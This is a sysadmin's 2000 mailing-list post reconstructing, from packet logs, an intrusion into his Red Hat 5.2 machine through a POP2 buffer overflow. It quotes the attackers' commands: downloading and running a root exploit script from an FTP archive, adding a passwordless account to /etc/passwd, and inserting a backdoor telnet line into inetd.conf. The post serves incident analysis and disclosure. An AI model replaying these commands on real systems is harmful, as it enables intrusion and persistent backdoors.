Someone cracked my linux 5.2 machine on 5 July 2000!!!!

========================================================
Very long account of successful hack of a redhat 5.2 machine
via port 109.
If you're not into linux security, please go to the next
e-mail item.
========================================================


Anyone with port 109 open on a red hat machine
should comment out the 109 line in /etc/inetd/conf
and execute "killall -HUP inetd" immediately.
This is the opinion I've come to after realising that
my old redhat macine "rat" was hacked on 5 July 2000
(July 4 in the S at that time!!).

I found this line in /etc/passwd (last line):

bob::100:100::/:/bin/bash

I also found this last line in /etc/inetd.conf:

7000 stream tcp nowait root /usr/sbin/tcpd in.telnetd

I don't remember that being there.

Anyway, I looked back over my logs and found the 
sequence of events leading to the hack.
It started with a port 109 (POP2) access by
216.233.33.53 (node-d8e92135.powerinter.net)
at 10:38 on 4 July 2000.
This was followed up at 02:33 local time on 5 July 2000
by the real pop2 hack from 210.205.10.6 (somewhere in Korea):

210.205.10.0-210.205.10.127     (INCOM) INCOM I&C CO. LTD; Jinsung Bldg. 996-1 Daechi-Dong, Kangnam-Ku, Seoul; Seoul; KR

At 02:49 on 5 July 2000, there was a pop2 access from:

213.25.241.20 (pa20.nowysacz.sdi.tpnet.pl).

This access seemed to be cliaming to be the user:
migux.mig.be:nobody.

Then "rat" initiated an access to port 514 (shell) on 
migux.mig.be.
All of these accesses failed with the RST/ACK response.

Then "rat" was caused to try to access port 143 (imap)
of host migux.mig.be, successfully.

Then there's an exchange of password, authentication etc.
between "rat" and the Belgian host.

----------------------------------------------
Question:
Why on earth is the POP mail software programmed to go off
and try to log into other machines on ports 514 and 143?
This doesn't sound like such a good idea to me.

-----------------------------------------------
Next, at 02:49:51, the Polish user gets a message like:

#0 messages in {migux.mig.be ....

The Polish user then types "FOLD" followed by a large number
of copies of the byte 0x90.
The packet length is 1044 bytes.
An overflow attack, I think.

============================
Then rat sends the text:

2:49 a.m. up 25 days,  1:42....

============================
Then the Polish user types:

cat /etc/passwd

And "rat" reponds with the contents of /etc/passwd.

============================
Polish user types

cd /tmp
ftp ftp.technotronic.com

============================
Response at 2:50:34 is:

220-ftp.technotronic.com

============================
Then the Polish user logs in as anonymous
with password <A HREF="mailto:azz@tin.it.">azz@tin.it.</A>
This is relayed by rat to the technotronic site.

This connection gets closed by the technotronic site?
(I'm not sure about this.)

============================
The the Polish user types "hash" to my "pop2" client.
Then "bin".
Then "cd unix".
Then "cd linux-exploits".
Then "cd redhat".
These seem to be manual, space by 4-5 seconds.
Then "cd 5.2".
Then "rootcron.sh".
Then "exit".

============================
Then there's a 212-byte packet which starts:

Name (ftp.technotronic.com:n...
Probably it's:

Name (ftp.technotronic.com:nobody...

Question:
Does anyone know if this executes a script?
E.g. the rootcron.sh file?

============================
Then the Polish user types:

ftp.technotronic.com

Then rat opens an FTP connection to sword.damocles.com.
The machine responds:

220-sword.damocles.com.FTP.ser....

sword.damocles.com responds that it is disconnecting.

============================
Then the Polish user types:

ankdsfnkjdsfjkljkl

"rat" relays this to sword.damocles.com:

USER ankdsfnkjdsfjkljkl

"rat" reponds to the Polish user on the pop2 connection:

Name: (technotronic.com:nobody....

============================
"rat" sends the following on pop2 connection:

POP2 rat.topology.org V4.4

Polish user sends:

HELO migux.mig.be:nobody n0b

===========================
"rat" initiates connection to migux.mig.be,
this time successfully, on port "shell" (514).

There's a long sequence of packets with no payload.

================================
Then rat opens a new connection to the imap2 port of migux.
There is this response from migux.mig.be at 03:11:32:

* OK migux.mig.be IMAP4rev1

"rat" responds with:

00000000 CAPABILITY

"migux" sends:

* CAPABILITY IMAP4 IMAP4REV1

"rat" sends:

00000001 AUTHENTICATE LOGIN

"migux" sends:

+.VXNlciBOYW1lAA==

This looks to me like a password challenge?
"rat" sends:

bm9ib2R5

migux sends:

+.UGFzc3dvcmQA

rat sends:

bjBiMGR5

migux sends:

00000001 OK AUTHENTICATE com....

rat sends:

00000002 SELECT INBOX

migux sends:

* 0 EXISTS 
* 0 RECENT
* 0 OKAY
etc. etc. ....

============================
Now "rat" sends to the Polish user:

#0 messages in {migux.mig.be....

FOLD 0x90 0x90....

I.e. a lot of 0x90 characters, in a 1044 byte packet.
I don't know what the rest is.

==============================
Then "rat" sends to the Polish user on the pop2 connection:

  3:11 am  up 25 days, 2:04....

Polish user types:

cd /ymp

Polish user types:

cd /tmp
ls

"rat" responds with directory listing.

==============================
Polish user types

ftp ftp.technotronic.com

Then rat opens connection to ftp.technotronic.com again!!

Question:
Why does a pop2 session allow the user to open FTP connections?
Is this normal?

============================
Polish user logs in as "anonymous" with password "<A HREF="mailto:azz@tin.it">azz@tin.it</A>".
This is typed over the pop2 connection and relayed over the
FTP connection to ftp.technotronic.com.

The response from the FTP server is:

You are user #6 of 50 si....

"rat" sends:

SYST

FTP server responds with:

8

Polish user types:

hash
bin

"rat" sends to FTP server:

TYPE I

FTP server responds with:

200 Type okay

Polish user types:

cd unix
cd linux-exploits
cd redhat
cd 5.2
get rootcron.sh

Then the file is transferred.
It starts with:

--------------------------
#!/bin/sh 

clear

echo '----
--------------------------

Another chunk of text of this file is:

--------------------------
....f__

chmod 755 /tmp/vixie-ro....
--------------------------

The total is about 2490 bytes.

==================================
Then rat responds to Polish user on pop2 connection with:

# 

Polish user types "exit" on pop2 connection.

===================================
Polish user types:

chmod +x rootcron.sh
./rootcron.sh

"rat" responds with:

----------------------------------

I.e. a row of hyphens.

==================================
Then "rat" sends:

Marchew Hyperreal Industries

Then are lots of empty pop2 packets.
Or rather, "rat" sends lots of packets
containing 0x2e (full stop?).

Then rat sends:

 [+] Huh, done. Removing cron....

==================================
Polish user sends:

whoami

"rat" responds:

nobody

Polish user types:

./rootcron.sh

Exactly the same sequence follows as above.
But then the Polish user types:

whoami

and "rat" responds:

root

==================================
Polish user types:

cd ..
echo bob::100:100::/:/bin/ba....

Obviously this /bin/bash.

Then the Polish user types:

cat /etc/passwd

"rat" responds with the /etc/passwd file.

Then "rat" sends this text over the pop2 connection:

[*] Exploit done.

=================================
Then the Polish user sends lots of telnet SYN packets!
And then a SYN packet to port 7000.
(This was added to the inetd.conf file, remember!)
But the 7000 port connection is refused: RST/ACK.

==================================
Then the Polish user opens a new pop2 connection.
Polish user sends HELO migux.mig.be:nobody again.
Then "rat" goes through trying to connect to
migux.mig.be on rsh-port again, fails, and then
tries the IMAP2 port.

The same long sequence then happens again as above,
and the Polish user again sends:

FOLD 0x90 0x90....

I.e. binary 0x90 characters in a big packet.

Then Polish user sends:

cd /tmp
ftp shouten.members......

Then a bit later, Polish user types:

shouten

Then rat sends a SYN packet to the FTP port of 
IP host 216.167.96.108.

This host replies with SYN/ACK.
Polish user types:

shouten

Then host 216.167.96.108 opens a connection to rat's "auth" port.
It then sends:

5940, 21

Coincidentally, 5940 is the port that rat used to call the
216.167.96.108 port 21 with.

"rat" responds with:

5940 , 21 : USERID : OTHER : ....

===================================
The Polish user then sends:

RWknnUhqW

Then the host 216.167.96.108 sends:

220 ProFTPD1.2.0pre10 Serve....

"rat" sends:

USER shouten

Password is sent:

RWknnUhqW

Response from FTP server is:

500 PASSWORD: PASS not underst.....

"rat" then sends to the Polish user on the pop2 link:

Name (shouten.members.easysp ....
Login failed

Then there's more stuff that's not too different to before,
followed by this from the Polish user:

PASS RWknUhqW

Then what seem to be more typing errors.

This all seems to peter out and goes quiet.

=======================================================
=======================================================
Then at 03:59:47 on the same day,a bout 1.5 hours later,
there's another pop2 access from:

212.141.81.73 (gw7a60-1-d327.wind.it)

This starts the same:

HELO migux.mig.be:nobody n0b....

The connection to imap2 port of migux happens again.

But this time, after a lot of stuff that looks the same, there's
this from rat to the Italian user:

System.map
badger
bin
boot
b....

That just happens to be a listing of my root directory on "rat".
Then they type:

cd /tmp
pwd
ls
./rootcron.sh

Same response, with dots being displayed to show progress.

Then the same "done" message.
Then "whoami" followed by "root" response from "rat.

Then the Italian user types:

echo 7000 stream tcp nowait

This obviously caused the mysterious line in my inetd.conf file!!

=======================================================
Then the Italian user typed

cat /etc/inetd.conf

"rat" displays the contents.
Then the user types:

cat /etc/passwd

This is typed a second time.
In fact, it is typed 5 times.
maybe they were making a copy to run through a password guesser.

Then another user from Italy connects up!!!!!!
This time it's 

212.141.82.79 (gw7a61-d79.wind.it)

While the second user is logging in to pop2, the first user
types "cat /etc/passwd" again.

After lots of boring stuff, the second user login
 now types:

killall -HUP inetd
ps -aux
cat /etc/passwd
killall -HUP inetd
ps -aux
cat /etc/passwd
cat /etc/passwd
cat /etc/inetd.conf
cat /etc/passwd
cd /tmp
pwd
cat /etc/passwd
ftp shouten.members.easyspac

The same login as "shouten" occurs again with
password = RWknUhqW

This fails.

Then there's more of this from the two logins mixed:

cat /etc/passwd
cat /etc/passwd

======================================
Then suddenly there's a telnet attempt to rat from
 213.167.205.19, which appears to be in Europe.

But the telnet port is blocked!

Then there's more of....

cat /etc/passwd
cat /etc/passwd
cat /etc/passwd
cat /etc/hosts.deny
cat /etc/passwd
cat /etc/hosts.deny
cat /etc/hosts.deny
cat /etc/hosts.deny

I don't really understand all this stuff!!

Bingo!!!!!!!!!!
I just checked my logs.
At about 4:15, I changed my firewall to stop port 109.
So until 4:30 (the time of the above stuff), all of these
packets were just CP re-transmissions.

It's a jolly good thing I was up at that time and was
alert enough to block all that stuff!!!!!!!

At 08:59:53, same day, along came a repeat attempt
by 212.141.80.20 (gw7a60-1-d20.wind.it) on the pop2 port.
But this time - no problem.
The firewall stopped them.

===================================================
===================================================

Clearly if I hadn't been awake at 4:15 a.m. on 5 July 2000,
my machine could have suffered much more.

I think I will now go round an tighten up all the security.
Maybe I'll buy a new firewall machine, and fit it out with
much more secure stuff.

===================================================

Moral of story:

I think that Mark Newton was right.
The .rhosts thing is very bad.
These hackers could have broken into all of my computers
from one computer.

Trouble is, though, that "ssh" lets root read the sh password
in clear from a unix port.
So that's very bad too!!!

Cheers,
Alan Kennington.
